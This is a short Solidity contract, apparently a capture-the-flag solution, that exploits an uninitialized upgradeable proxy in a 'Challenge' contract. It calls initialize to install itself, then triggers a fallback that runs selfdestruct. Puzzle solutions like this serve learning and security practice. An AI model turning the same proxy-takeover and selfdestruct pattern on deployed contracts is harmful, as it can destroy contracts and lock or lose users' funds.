// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import './Setup.sol';

contract Exploit {
    Challenge challenge;
    Slogan slogan;
    constructor (Challenge _challenge) payable {
        // I really liked this one! :)
        // looks simple at first, but there's quite a bit to think about :D
        challenge = _challenge;
        slogan = Slogan(challenge.sloganContract());
    }

    function exploit() public {
        bytes memory data = abi.encodeWithSelector(InitialiazableUpgradeableProxy.initialize.selector, address(this), "");        
        challenge.callSloganContract{value: 0.001 ether}(data);
        challenge.callSloganContract("");
    }

    fallback() external payable {
        selfdestruct(payable(0));
    }

}